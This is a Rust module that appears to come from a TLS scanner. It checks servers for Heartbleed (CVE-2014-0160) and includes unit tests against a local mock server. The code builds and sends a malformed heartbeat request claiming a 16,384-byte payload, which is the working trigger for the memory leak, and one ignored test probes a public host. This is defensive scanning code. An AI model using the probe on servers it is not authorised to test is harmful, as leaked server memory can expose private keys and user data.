// Heartbleed (CVE-2014-0160) vulnerability checker

use crate::constants::{
    CONTENT_TYPE_HEARTBEAT, HEARTBEAT_REQUEST, TLS_HANDSHAKE_TIMEOUT, VERSION_TLS_1_2,
};
use crate::protocols::{Protocol, handshake::ClientHelloBuilder};
use crate::utils::network::Target;
use crate::{Result, TlsError};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

fn read_u16_at(data: &[u8], offset: usize) -> Option<u16> {
    data.get(offset..offset.checked_add(2)?)?
        .try_into()
        .ok()
        .map(u16::from_be_bytes)
}

#[cfg(test)]
fn write_u16_at(data: &mut [u8], offset: usize, value: u16) {
    data.get_mut(offset..offset + 2)
        .expect("test fixture should contain u16 placeholder")
        .copy_from_slice(&value.to_be_bytes());
}

#[cfg(test)]
fn write_u24_at(data: &mut [u8], offset: usize, value: usize) {
    data.get_mut(offset..offset + 3)
        .expect("test fixture should contain u24 placeholder")
        .copy_from_slice(&[
            ((value >> 16) & 0xff) as u8,
            ((value >> 8) & 0xff) as u8,
            (value & 0xff) as u8,
        ]);
}

/// Heartbleed detection result with detailed information
#[derive(Debug, Clone)]
pub struct HeartbleedResult {
    pub vulnerable: bool,
    pub bytes_received: usize,
    pub bytes_sent: usize,
    pub details: String,
    /// Whether the test was actually performed (false if connection/parsing failed)
    pub tested: bool,
}

/// Heartbleed vulnerability tester
pub struct HeartbleedTester<'a> {
    target: &'a Target,
    sni_hostname: Option<String>,
    connect_timeout: Duration,
    read_timeout: Duration,
    starttls: Option<crate::starttls::StarttlsProtocol>,
    starttls_hostname: Option<String>,
}

impl<'a> HeartbleedTester<'a> {
    /// Create new Heartbleed tester
    pub fn new(target: &'a Target) -> Self {
        Self {
            target,
            sni_hostname: None,
            connect_timeout: Duration::from_secs(10),
            read_timeout: TLS_HANDSHAKE_TIMEOUT,
            starttls: None,
            starttls_hostname: None,
        }
    }

    pub fn with_sni(mut self, sni: Option<String>) -> Self {
        self.sni_hostname = sni;
        self
    }

    /// Configure STARTTLS negotiation before the heartbeat probe.
    pub fn with_starttls(
        mut self,
        protocol: Option<crate::starttls::StarttlsProtocol>,
        hostname: Option<String>,
    ) -> Self {
        self.starttls = protocol;
        self.starttls_hostname = hostname;
        self
    }

    /// Hostname used for STARTTLS negotiation (EHLO/`to`/…).
    fn starttls_negotiation_hostname(&self) -> String {
        self.starttls_hostname
            .clone()
            .unwrap_or_else(|| self.target.hostname.clone())
    }

    /// Test for Heartbleed vulnerability
    /// CVE-2014-0160: TLS Heartbeat Extension memory disclosure
    pub async fn test(&self) -> Result<HeartbleedResult> {
        let mut any_tested = false;
        for protocol in [Protocol::TLS10, Protocol::TLS11, Protocol::TLS12] {
            let result = self.test_protocol(protocol).await?;
            if result.tested {
                any_tested = true;
            }
            if result.vulnerable {
                return Ok(result);
            }
        }

        Ok(HeartbleedResult {
            vulnerable: false,
            bytes_received: 0,
            bytes_sent: 3,
            details: if any_tested {
                "Not vulnerable - No memory leak detected across TLS 1.0/1.1/1.2".to_string()
            } else {
                "Unable to test - No TLS protocol connection succeeded (inconclusive)".to_string()
            },
            tested: any_tested,
        })
    }

    /// Test specific protocol for Heartbleed
    async fn test_protocol(&self, protocol: Protocol) -> Result<HeartbleedResult> {
        let addr = self
            .target
            .socket_addrs()
            .first()
            .copied()
            .ok_or(crate::TlsError::NoSocketAddresses)?;

        // Connect TCP (upgrading via STARTTLS first for plaintext-first services)
        let mut stream = match crate::utils::network::connect_with_starttls(
            addr,
            self.connect_timeout,
            self.starttls,
            &self.starttls_negotiation_hostname(),
        )
        .await
        {
            Ok(s) => s,
            Err(_) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: "Connection failed - Vulnerability status UNKNOWN (unable to test)"
                        .to_string(),
                    tested: false,
                });
            }
        };

        // Build ClientHello with Heartbeat extension
        let mut builder = ClientHelloBuilder::new(protocol);
        builder.add_ciphers(&[0xc014, 0xc00a, 0x0039, 0x0038, 0x0035]);

        // Add heartbeat extension (type 0x000f)
        let heartbeat_ext = vec![0x01]; // peer_allowed_to_send
        builder.add_extension(crate::protocols::Extension::new(0x000f, heartbeat_ext));

        let sni_hostname = crate::utils::network::sni_hostname_for_target(
            &self.target.hostname,
            self.sni_hostname.as_deref(),
        );
        let client_hello = builder.build_with_defaults(sni_hostname.as_deref())?;

        // Send ClientHello
        let response = match timeout(self.read_timeout, async {
            stream.write_all(&client_hello).await?;

            // Read ServerHello
            let mut resp = vec![0u8; 16384];
            let n = stream.read(&mut resp).await?;
            resp.truncate(n);
            Ok::<Vec<u8>, std::io::Error>(resp)
        })
        .await
        {
            Ok(Ok(resp)) if !resp.is_empty() => resp,
            _ => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: "ServerHello timeout or empty response".to_string(),
                    tested: false,
                });
            }
        };

        // Check if server accepted heartbeat extension
        match self.check_heartbeat_extension(&response) {
            Ok(true) => {}
            Ok(false) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: "Heartbeat extension not supported by server".to_string(),
                    tested: true,
                });
            }
            Err(error) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: 0,
                    details: format!("Unable to test - malformed ServerHello: {}", error),
                    tested: false,
                });
            }
        }

        // Send malicious heartbeat request
        self.send_malicious_heartbeat(&mut stream).await
    }

    /// Check if ServerHello contains heartbeat extension.
    /// Parses the TLS ServerHello structure to find extensions, avoiding
    /// false positives from matching 0x000f in session ID or other fields.
    fn check_heartbeat_extension(&self, data: &[u8]) -> Result<bool> {
        // TLS ServerHello minimum: 5 (record) + 4 (handshake) + 2 (version) + 32 (random) + 1 (sid len) = 44
        if data.len() < 44 {
            return Ok(false);
        }

        // Verify this is a Handshake record (0x16) containing ServerHello (0x02)
        if data.first() != Some(&0x16) || data.get(5) != Some(&0x02) {
            return Ok(false);
        }

        // Session ID length at offset 43
        let Some(sid_len) = data.get(43).copied().map(usize::from) else {
            return Ok(false);
        };
        if sid_len > 32 {
            // Malformed ServerHello: session_id_length exceeds TLS maximum
            return Ok(false);
        }
        // After session ID: cipher suite (2 bytes) + compression method (1 byte)
        let ext_offset = 44 + sid_len + 2 + 1;

        // Check we have room for extensions length (2 bytes)
        if ext_offset + 2 > data.len() {
            return Ok(false);
        }

        let Some(ext_total_len) = read_u16_at(data, ext_offset).map(usize::from) else {
            return Ok(false);
        };
        let ext_start = ext_offset + 2;
        let ext_end = ext_start + ext_total_len;
        if ext_end > data.len() {
            return Err(crate::TlsError::ParseError {
                message: "ServerHello extension block extends beyond declared length".to_string(),
            });
        }

        // Walk extensions looking for heartbeat (type 0x000f)
        let mut pos = ext_start;
        while pos + 4 <= ext_end {
            let Some(ext_type) = read_u16_at(data, pos) else {
                return Ok(false);
            };
            let Some(ext_len) = read_u16_at(data, pos + 2).map(usize::from) else {
                return Ok(false);
            };
            pos += 4;

            if ext_type == 0x000f {
                return Ok(true);
            }

            if pos + ext_len > ext_end {
                return Err(crate::TlsError::ParseError {
                    message: "ServerHello extension data extends beyond declared length"
                        .to_string(),
                });
            }
            pos += ext_len;
        }

        Ok(false)
    }

    /// Validate that the response is a proper Heartbeat Response (not a TLS alert or other response).
    /// Returns true if the response structure indicates a valid heartbeat response.
    fn validate_heartbeat_response(&self, response: &[u8]) -> bool {
        // Minimum valid heartbeat response: 5 (TLS record header) + 3 (heartbeat header) = 8 bytes
        if response.len() < 8 {
            return false;
        }

        // Check TLS record header
        // Content type must be Heartbeat (0x18)
        let Some(content_type) = response.first().copied() else {
            return false;
        };
        if content_type != CONTENT_TYPE_HEARTBEAT {
            tracing::debug!(
                "Heartbleed: Response content type is not Heartbeat (0x{:02x}, expected 0x18)",
                content_type
            );
            return false;
        }

        // Version check (should be TLS 1.0, 1.1, or 1.2)
        let Some((&major, rest)) = response.get(1..).and_then(|tail| tail.split_first()) else {
            return false;
        };
        let Some(&minor) = rest.first() else {
            return false;
        };
        if major != 0x03 || !(0x01..=0x03).contains(&minor) {
            tracing::debug!(
                "Heartbleed: Response has unexpected TLS version 0x{:02x}{:02x}",
                major,
                minor
            );
            return false;
        }

        let Some(record_len) = read_u16_at(response, 3).map(usize::from) else {
            return false;
        };
        if record_len + 5 != response.len() {
            tracing::debug!(
                "Heartbleed: Response record length {} does not match buffer length {}",
                record_len,
                response.len()
            );
            return false;
        }

        // Heartbeat message type must be Response (0x02), not Request (0x01)
        // Response structure: type (1 byte) + length (2 bytes) + payload
        let Some(heartbeat_type) = response.get(5).copied() else {
            return false;
        };
        if heartbeat_type != 0x02 {
            tracing::debug!(
                "Heartbleed: Response type is not HeartbeatResponse (0x{:02x}, expected 0x02)",
                heartbeat_type
            );
            return false;
        }

        let Some(heartbeat_len) = read_u16_at(response, 6).map(usize::from) else {
            return false;
        };
        if heartbeat_len + 3 != record_len {
            tracing::debug!(
                "Heartbleed: Heartbeat payload length {} does not match record length {}",
                heartbeat_len,
                record_len
            );
            return false;
        }

        // If we got here, the response structure is valid
        // Note: The actual vulnerability check compares the received length with our sent length
        // A legitimate response would have a small length field, a vulnerable server would have
        // a much larger length field (claiming 16384 bytes)
        true
    }

    /// Send malicious heartbeat request and check for memory leak
    async fn send_malicious_heartbeat(&self, stream: &mut TcpStream) -> Result<HeartbleedResult> {
        const HEARTBEAT_CLAIMED_PAYLOAD_LEN: usize = 16387; // claimed in TLS record header (3 + 16384)
        const HEARTBEAT_BYTES_SENT: usize = 8; // actual bytes sent (5 TLS header + 1 type + 2 length)
        // Minimum suspicious response threshold.
        // A legitimate heartbeat response echoes our 3 bytes payload plus 3 bytes header (type + length).
        // TLS record overhead: 5 bytes (content type + version + length).
        // Total legitimate: ~11 bytes minimum.
        //
        // CRITICAL: We must distinguish between legitimate heartbeat responses and memory leaks.
        // A legitimate Heartbeat Response (type 0x02) would echo our 3 bytes payload + 3 bytes header
        // = 6 bytes, plus 5 bytes TLS record = 11 bytes total.
        //
        // A vulnerable server returns the claimed length (16384 bytes) which is far larger.
        // We use 16 bytes as threshold to avoid false positives from minimal echo responses
        // while still catching small leaks (some vulnerable implementations leak ~32-64 bytes).
        //
        // Response structure validation:
        // - Content type must be Heartbeat (0x18)
        // - Heartbeat message type must be Response (0x02), not Request (0x01)
        // - Payload length field claims more bytes than we sent
        //
        // See: CVE-2014-0160 - heartbeat allows reading up to 64KB of memory.
        const MIN_SUSPICIOUS_RESPONSE: usize = 16;
        // Responses below this threshold warrant manual verification warning
        const WARNING_THRESHOLD: usize = 32;

        // Build malicious heartbeat request.
        // The TLS record length must encompass the full heartbeat message:
        // type(1) + length(2) + claimed_payload(0x4000) = 3 + 16384 = 16387 bytes.
        // A vulnerable server reads past the 3-byte heartbeat header into process memory.
        let claimed_payload_length: u16 = 0x4000; // 16384 bytes — the malicious claim
        let heartbeat_msg_len = 3 + claimed_payload_length as usize; // type(1) + length(2) + payload
        let heartbeat_msg_len =
            u16::try_from(heartbeat_msg_len).map_err(|_| TlsError::ParseError {
                message: "Heartbleed heartbeat message length too large".to_string(),
            })?;
        let version = VERSION_TLS_1_2.to_be_bytes();
        let heartbeat_msg_len = heartbeat_msg_len.to_be_bytes();
        let heartbeat = vec![
            CONTENT_TYPE_HEARTBEAT,                // Content Type: Heartbeat (0x18)
            version[0],                            // Version: TLS 1.2 (0x0303)
            version[1],                            // Version low byte
            heartbeat_msg_len[0],                  // Record length high byte
            heartbeat_msg_len[1],                  // Record length low byte
            HEARTBEAT_REQUEST,                     // Heartbeat request type (0x01)
            (claimed_payload_length >> 8) as u8,   // Payload length high byte
            (claimed_payload_length & 0xff) as u8, // Payload length low byte
        ];

        // Send heartbeat request
        let result = match timeout(self.read_timeout, async {
            stream.write_all(&heartbeat).await?;

            // Read response
            let mut response = vec![0u8; 65535];
            let n = stream.read(&mut response).await?;
            response.truncate(n);
            Ok::<Vec<u8>, std::io::Error>(response)
        })
        .await
        {
            Ok(Ok(response)) => response,
            Ok(Err(_)) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: HEARTBEAT_BYTES_SENT,
                    details:
                        "Connection error during heartbeat test - server may have closed connection"
                            .to_string(),
                    tested: false,
                });
            }
            Err(_) => {
                return Ok(HeartbleedResult {
                    vulnerable: false,
                    bytes_received: 0,
                    bytes_sent: HEARTBEAT_BYTES_SENT,
                    details:
                        "Timeout waiting for heartbeat response - server may have closed connection"
                            .to_string(),
                    tested: false,
                });
            }
        };

        let n = result.len();

        // Validate response structure
        let is_valid_heartbeat_response = self.validate_heartbeat_response(&result);

        // If response doesn't look like a valid heartbeat response, it's suspicious
        // (server might be returning an error or TLS alert)
        let vulnerable = n >= MIN_SUSPICIOUS_RESPONSE && is_valid_heartbeat_response;
        let details = if vulnerable {
            if n < WARNING_THRESHOLD {
                format!(
                    "VULNERABLE: Heartbleed detected. Received {} bytes (sent {} bytes, claimed {} bytes in heartbeat). \
                     NOTE: Response size is small, manual verification recommended.",
                    n, HEARTBEAT_BYTES_SENT, HEARTBEAT_CLAIMED_PAYLOAD_LEN
                )
            } else {
                format!(
                    "VULNERABLE: Heartbleed detected. Received {} bytes (sent {} bytes, claimed {} bytes). Memory leak confirmed.",
                    n, HEARTBEAT_BYTES_SENT, HEARTBEAT_CLAIMED_PAYLOAD_LEN
                )
            }
        } else if n == 0 {
            "Connection closed by server during heartbeat test - inconclusive. \
             Server may have rejected malformed heartbeat (not vulnerable) or \
             may have crashed (potentially vulnerable). Manual verification recommended."
                .to_string()
        } else if !is_valid_heartbeat_response && n > 0 {
            format!(
                "Not vulnerable - Response does not appear to be a valid heartbeat response. \
                 Received {} bytes. Manual verification recommended if server returned unexpected data.",
                n
            )
        } else {
            format!(
                "Not vulnerable - Received {} bytes (sent {} bytes, claimed {} bytes, threshold: {})",
                n, HEARTBEAT_BYTES_SENT, HEARTBEAT_CLAIMED_PAYLOAD_LEN, MIN_SUSPICIOUS_RESPONSE
            )
        };

        Ok(HeartbleedResult {
            vulnerable,
            bytes_received: n,
            bytes_sent: HEARTBEAT_BYTES_SENT,
            details,
            // n=0: server sent nothing → conclusive (not vulnerable)
            // n 1..MIN_SUSPICIOUS_RESPONSE: ambiguous partial response → inconclusive
            // n>=MIN_SUSPICIOUS_RESPONSE: enough data to classify
            tested: n == 0 || n >= MIN_SUSPICIOUS_RESPONSE,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr};
    use tokio::net::TcpListener;

    async fn spawn_heartbeat_server(response_size: usize) -> u16 {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        tokio::spawn(async move {
            if let Ok((mut socket, _)) = listener.accept().await {
                let mut buffer = [0u8; 4096];
                let _ = socket.read(&mut buffer).await;

                // Build a valid TLS Heartbeat Response structure
                // Content type: Heartbeat (0x18)
                // Version: TLS 1.2 (0x0303)
                // Length: response_size
                // Heartbeat type: Response (0x02)
                // Payload length: response_size - 3 (after type and length bytes)
                // Payload: zeros

                let mut response = Vec::new();
                response.push(0x18); // Content type: Heartbeat
                response.push(0x03); // Version TLS 1.2
                response.push(0x03);

                // Record length (2 bytes, big-endian)
                // For heartbeat response: type(1) + length(2) + payload
                let payload_len = response_size.saturating_sub(3);
                let record_len = 3 + payload_len;
                response.push((record_len >> 8) as u8);
                response.push((record_len & 0xff) as u8);

                // Heartbeat response type (0x02)
                response.push(0x02);

                // Payload length (2 bytes, big-endian)
                response.push((payload_len >> 8) as u8);
                response.push((payload_len & 0xff) as u8);

                // Payload (zeros)
                response.extend(vec![0u8; payload_len]);

                let _ = socket.write_all(&response).await;
            }
        });

        port
    }

    #[tokio::test]
    #[ignore] // Requires network access
    async fn test_heartbleed_modern_server() {
        let target = Target::parse("www.google.com:443")
            .await
            .expect("test assertion should succeed");
        let tester = HeartbleedTester::new(&target);

        let result = tester.test().await.expect("test assertion should succeed");

        // Google should not be vulnerable
        assert!(!result.vulnerable);
    }

    #[test]
    fn test_heartbeat_extension_check() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            sni_hostname: None,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
            starttls: None,
            starttls_hostname: None,
        };

        // Build a minimal valid ServerHello with heartbeat extension (0x000f)
        // Record: type=0x16, version=0x0303, length=TBD
        // Handshake: type=0x02, length=TBD
        // ServerHello: version=0x0303, random(32), sid_len=0, cipher=0x1301, compress=0x00
        // Extensions: len=TBD, ext_type=0x000f, ext_len=1, ext_data=0x01
        let mut data_with_ext = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, // TLS record header (length placeholder)
            0x02, 0x00, 0x00, 0x00, // Handshake header (length placeholder)
            0x03, 0x03, // ServerHello version TLS 1.2
        ];
        data_with_ext.extend_from_slice(&[0xAA; 32]); // 32 bytes random
        data_with_ext.push(0x00); // session_id_length = 0
        data_with_ext.extend_from_slice(&[0x13, 0x01]); // cipher suite
        data_with_ext.push(0x00); // compression method
        // Extensions: total length=5, heartbeat ext (type=0x000f, len=1, data=0x01)
        data_with_ext.extend_from_slice(&[0x00, 0x05]); // extensions total length
        data_with_ext.extend_from_slice(&[0x00, 0x0f]); // ext type: heartbeat
        data_with_ext.extend_from_slice(&[0x00, 0x01]); // ext length
        data_with_ext.push(0x01); // heartbeat mode: peer_allowed_to_send
        // Patch record and handshake lengths
        let record_len = (data_with_ext.len() - 5) as u16;
        write_u16_at(&mut data_with_ext, 3, record_len);
        let hs_len = data_with_ext.len() - 9;
        write_u24_at(&mut data_with_ext, 6, hs_len);

        assert!(tester.check_heartbeat_extension(&data_with_ext).unwrap());

        // Same ServerHello but WITHOUT the heartbeat extension (no extensions)
        let mut data_without_ext = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x03,
        ];
        data_without_ext.extend_from_slice(&[0xAA; 32]);
        data_without_ext.push(0x00);
        data_without_ext.extend_from_slice(&[0x13, 0x01]);
        data_without_ext.push(0x00);
        let record_len = (data_without_ext.len() - 5) as u16;
        write_u16_at(&mut data_without_ext, 3, record_len);
        let hs_len = data_without_ext.len() - 9;
        write_u24_at(&mut data_without_ext, 6, hs_len);
        assert!(!tester.check_heartbeat_extension(&data_without_ext).unwrap());
    }

    #[test]
    fn test_heartbeat_extension_short_data_false() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            sni_hostname: None,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
            starttls: None,
            starttls_hostname: None,
        };

        assert!(!tester.check_heartbeat_extension(&[0x00]).unwrap());
    }

    #[test]
    fn test_heartbeat_extension_exact_two_bytes() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            sni_hostname: None,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
            starttls: None,
            starttls_hostname: None,
        };

        // Two bytes alone is insufficient - need at least 3 bytes for the search loop
        // (saturating_sub(2) means we need at least 3 to have one iteration)
        // This test validates that minimum length is enforced
        assert!(!tester.check_heartbeat_extension(&[0x00, 0x0f]).unwrap());
    }

    #[test]
    fn test_validate_heartbeat_response_rejects_mismatched_lengths() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            sni_hostname: None,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
            starttls: None,
            starttls_hostname: None,
        };

        let response = [0x18, 0x03, 0x03, 0x00, 0x04, 0x02, 0x00, 0x01];
        assert!(!tester.validate_heartbeat_response(&response));
    }

    #[test]
    fn test_check_heartbeat_extension_rejects_truncated_extension_block() {
        let target = Target::with_ips(
            "test.com".to_string(),
            443,
            vec!["127.0.0.1".parse().unwrap()],
        )
        .unwrap();
        let tester = HeartbleedTester {
            target: &target,
            sni_hostname: None,
            connect_timeout: Duration::from_secs(5),
            read_timeout: Duration::from_secs(5),
            starttls: None,
            starttls_hostname: None,
        };

        let mut data = vec![
            0x16, 0x03, 0x03, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x03,
        ];
        data.extend_from_slice(&[0u8; 32]);
        data.push(0x00);
        data.extend_from_slice(&[0x13, 0x01]);
        data.push(0x00);
        data.extend_from_slice(&[0x00, 0x06, 0x00, 0x0f, 0x00, 0x01]);

        let rec_len = (data.len() - 5) as u16;
        write_u16_at(&mut data, 3, rec_len);
        let hs_len = data.len() - 9;
        write_u24_at(&mut data, 6, hs_len);

        let err = tester
            .check_heartbeat_extension(&data)
            .expect_err("truncated extension block should fail");
        assert!(
            err.to_string()
                .contains("extension block extends beyond declared length")
        );
    }

    #[tokio::test]
    async fn test_send_malicious_heartbeat_detects_leak() {
        let port = spawn_heartbeat_server(256).await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester::new(&target);
        let addr = target
            .socket_addrs()
            .first()
            .copied()
            .expect("test target should have socket address");
        let mut stream = TcpStream::connect(addr).await.unwrap();
        let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();
        assert!(result.vulnerable);
        assert!(result.bytes_received > 16); // Above the threshold for vulnerability detection
    }

    #[tokio::test]
    async fn test_send_malicious_heartbeat_no_leak() {
        // Use a response size below the threshold to simulate a non-vulnerable server
        // A legitimate heartbeat echo would be ~11 bytes (3 payload + 3 header + 5 TLS record)
        // but we use 0 bytes to simulate a server that closes the connection immediately
        // or returns an error without leaking memory
        let port = spawn_heartbeat_server(0).await;
        let target = Target::with_ips(
            "localhost".to_string(),
            port,
            vec![IpAddr::V4(Ipv4Addr::LOCALHOST)],
        )
        .unwrap();
        let tester = HeartbleedTester::new(&target);
        let addr = target
            .socket_addrs()
            .first()
            .copied()
            .expect("test target should have socket address");
        let mut stream = TcpStream::connect(addr).await.unwrap();
        let result = tester.send_malicious_heartbeat(&mut stream).await.unwrap();
        assert!(!result.vulnerable);
        // Note: tested may be false if 0 bytes received (connection closed)
    }
}
